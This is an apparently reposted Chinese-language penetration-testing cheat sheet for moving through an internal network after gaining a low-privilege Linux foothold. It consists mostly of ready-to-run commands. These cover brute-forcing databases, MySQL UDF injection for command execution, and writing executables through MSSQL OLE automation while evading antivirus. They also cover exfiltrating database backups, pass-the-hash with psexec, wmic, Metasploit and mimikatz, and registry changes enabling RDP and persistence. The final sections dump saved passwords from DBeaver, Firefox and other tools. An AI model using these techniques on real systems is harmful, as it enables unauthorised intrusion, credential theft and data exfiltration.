---
title: 内网渗透流水账 - 渗透测试中心
url: https://buaq.net/go-147576.html
source: unSafe.sh - 不安全
date: 2023-02-02
fetch_date: 2025-10-04T05:27:56.141528
---

# 内网渗透流水账 - 渗透测试中心

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![]()

内网渗透流水账 - 渗透测试中心

0x00 环境Linux主机www权限主机无法出外网正向代理无法使用B段内网0x01 收集信息F-Scrack.py获取Redis, ES等PS: Scrack.py的mssql模块爆破不准确，可
*2023-2-1 23:46:0
Author: [www.cnblogs.com(查看原文)](/jump-147576.htm)
阅读量:58
收藏*

---

## 0x00 环境

1. Linux主机www权限
2. 主机无法出外网
3. 正向代理无法使用
4. B段内网

## 0x01 收集信息

F-Scrack.py获取Redis, ES等

```
PS: Scrack.py的mssql模块爆破不准确，可以自己写一个简单的
python Scrack.py -h 10.111.1.1-10.111.2.254 -p 3306,5432 -m 200 -t 6
```

### 1.Redis

key较多的时候不要使用keys \*

```
查看基本信息: master，数量，版本号
使用scan查看keys: scan 0 match * count 100
查看类型: type <key>
hash类型: hgetall <key>
```

### 2.MySQL

windows下可以先测试是否可写入插件目录:

```
select @@plugin_dir;

select hello into outfile <plugin_dir>;
```

然后使用msf的自带的udf，先转换为16进制，然后导出到插件目录:

```
use test;
set @a=concat('', 0x<hex_of_exe>);
create table Ghost(data LONGBLOB);
insert into Ghost values("");
update Ghost set data = @a;
select data from Ghost into DUMPFILE <dir>;
create function sys_eval returns string soname 'sys_eval.dll';

drop function sys_eval; //用完删除，养成好习惯
```

首选SYS\_EVAL, 尽量不要使用SYS\_EXEC(会崩溃)

### 3.mssql

mssql爆破尽量放在后面执行，动静会比较大。

```
mssql爆破成功之后，最好使用CLR来获取权限，直接使用`xp_cmdshell`会死翘翘,360会拦截
```

已知mssql的用户密码，certutil等工具会被拦截或者报警，可以使用mssql自带的工具写入到硬盘：

现开启存储过程:

```
sp_configure 'show advanced options', 1;
GO
RECONFIGURE;
GO
sp_configure 'Ole Automation Procedures', 1;
GO
RECONFIGURE;
```

#### mssql写大文件

比如exe之类的先转换为hex,然后再写入到文件:

xxd -plain /tmp/test.exe | tr -d '\n' > /tmp/dll.hex

```
declare @hexstring varchar(max);
set @hexstring = '转换之后的hex';
declare @file varbinary(max);
set @file = (select cast('' as xml).value('xs:hexBinary( substring(sql:variable("@hexstring"), sql:column("t.pos")) )', 'varbinary(max)')
from (select case substring(@hexstring, 1, 2) when '0x' then 3 else 0 end) as t(pos));

select @file;
declare @init int;
declare @filepath nvarchar(4000) = N'c:\22.exe';

EXEC sp_OACreate 'ADODB.Stream', @init OUTPUT; -- An instace created
EXEC sp_OASetProperty @init, 'Type', 1;
EXEC sp_OAMethod @init, 'Open'; -- Calling a method
EXEC sp_OAMethod @init, 'Write', NULL, @file; -- Calling a method
EXEC sp_OAMethod @init, 'SaveToFile', NULL, @filepath, 2; -- Calling a method
EXEC sp_OAMethod @init, 'Close'; -- Calling a method
EXEC sp_OADestroy @init; -- Closed the resources
```

### 4.mssql备份

```
BACKUP DATABASE <db>
TO DISK = 'C:\Windows\temp\db.bak' WITH COMPRESSION, INIT, STATS = 5;
```

* 分卷压缩

```
rar.exe a -m0 -v100m C:\windows\temp\db.split C:\windows\tasks\db.bak

download C:\\windows\\temp\\db.split.rar /var/tmp/
```

### 6.pth

* wmi

```
wmic /node:192.168.1.158 /user:pt007 /password:admin123  process call create "cmd.exe /c ipconfig>d:\result.txt"
```

推荐使用wmiexec.vbs:

<https://github.com/l3m0n/pentest_study/blob/master/tools/wmiexec.vbs>

```
cscript C:\Windows\Tasks\aliwmi.vbs /cmd <ip>  "C:\Windows\system32\calc.exe"
```

* msf

```
use exploit/windows/smb/psexec
show options
set RHOST 192.168.81.129
set SMBPass 598DDCE2660D3193AAD3B435B51404EE:2D20D252A479F485CDF5E171D93985BF
set SMBUser Administrator
show options
run
```

* mimikatz || Cobalt Strike

```
mimikatz.exe privilege::debug "sekurlsa::pth /domain:. /user:administrator /ntlm:2D20D252A479F485CDF5E171D93985BF /run:cmd.exe" //传递hash
```

* psexec

```
psexec /accepteula //接受许可协议
sc delete psexesvc
psexec \\192.168.1.185 -u pt007 -p admin123 cmd.exe
```

* psexec.vbs

```
cscript psexec.vbs 192.168.1.158 pt007 admin123 "ipconfig"
```

* 远程命令执行sc

```
net use \\192.168.17.138\c$ "admin123" /user:pt007
net use
dir \\192.168.17.138\c$
copy test.exe \\192.168.17.138\c$
sc \\192.168.17.138 create test binpath= "c:\test.exe"
sc \\192.168.17.138 start test
sc \\192.168.17.138 del test
```

windows远程执行cmd的9种方法: <https://xz.aliyun.com/t/5957>

## 0x03 access is denied

对于任何非RID 500的本地管理员(Administrator)连接到Windows Vista+的计算机，无论采用wmi、psexec还是其它方法，使用的令牌都是中等令牌, 使用wmiexec的时候会修暗示Access is Denied

在抓取hash的情况下，可以修改注册表，使得本地管理员组成员都可以远程连接,作为一种持久化的手段。

```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

###RDP的PTH

#### 1.启动RDP

```
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 0x00000d3d /f  # 监听 3389 端口

开启3389
wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !="") call setallowtsconnections 1
```

#### 2.开启Restricted Admin mode

```
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
```

#### 3.增加防火墙规则

```
netsh advfirewall firewall add rule name="Remote Desktop" dir=in protocol=TCP localport=3389 action=allow
```

## 0x04 dump passwod

####dbeaver

dbeaver6的配置文件(不同版本存储的位置和解密方式不一样):

```
#密码加密存储位置:
C:\Users\<user>\AppData\Roaming\DBeaverData\workspace6\General\.dbeaver\credentials-config.json

#url和用户名:
C:\Users\<user>\AppData\Roaming\DBeaverData\workspace6\General\.dbeaver\data-sources.json
```

解密脚本: <https://gist.github.com/felipou/50b60309f99b70b1e28f6d22da5d8e61>

下载credentials-config.json脚本之后，使用python解密:python decrypt.py credentials-config.json，然后根据解密出来的id去data-sources.json里面找对应的IP和用户名。

老版本的密码是存储在:C:\Users\<users>\.dbeaver4\General\.dbeaver-data-source.xml，可以直接使用在线解密:<http://dbeaver-password-decrypter.s3-website-us-west-2.amazonaws.com/>

### 0x05 MobaXterm

有一个.ini的文件，有对应的IP信息和私钥地址
老版本的存储: C:\Users%USERNAME%\AppData\Roaming\MobaXterm
2020年的版本: C:\Users%USERNAME%\Documents\MobaXterm

### 0x05 VSCODE

Windows下的配置文件在这个地方:

```
%APPDATA%\Code\User\settings.json
```

可以根据配置文件找到笔记和ssh等存储位置

### 0x06 Firefox

三好师傅讲的很详细，我选择使用firepwd.py:

```
firefox的配置文件目录:
%APPDATA%\Mozilla\Firefox\Profiles\xxxxxxxx.default\

下载解密需要的文件:
key4.db和logins.json

下载解密脚本:
https://github.com/lclevy/firepwd

上面三个东西放在一个文件夹:
python3 firepwd.py
```

<https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAFirefox%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/>

### 0x07 截屏

1. CS里面的screenshot
2. msf里面: use espia screengrab
3. msf的持续截屏: post/windows/gather/screen\_spy
4. Win10自带: psr.exe /start /gui 0 /output C:\cool.zip /maxlogsize 1

### 0x08 搜索文件

```
在C盘搜索script.js这个文件:
dir /s /b C:\script.js
```

```

```

```

```

文章来源: https://www.cnblogs.com/backlion/p/17084533.html
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)